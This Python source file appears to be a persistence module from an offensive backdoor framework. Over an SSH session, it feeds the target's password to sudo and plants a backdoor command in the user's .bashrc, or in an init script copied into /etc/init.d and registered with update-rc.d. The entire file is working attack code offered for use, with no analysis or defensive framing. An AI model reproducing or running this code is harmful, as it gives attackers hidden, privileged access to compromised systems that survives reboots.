from module import *

class Startup(Module):

    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "startup"
        self.backdoor = backdoor
        self.options = {
                "bash": Option("bash", True, "Add to bashrc", False),
                "init": Option("init", False, "Add to system startup", False),
                }

    def exploit(self):
        if(self.get_value("bash")):
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + " > /dev/null \' >> .bashrc")
        if(self.get_value("init")):
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'" + self.backdoor.get_command() + "\' > file1234.sh")
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S chmod +x file1234.sh")
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv file1234.sh /etc/init.d/")
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S update-rc.d file1234.sh defaults")
        print(GOOD + self.name + " module success")

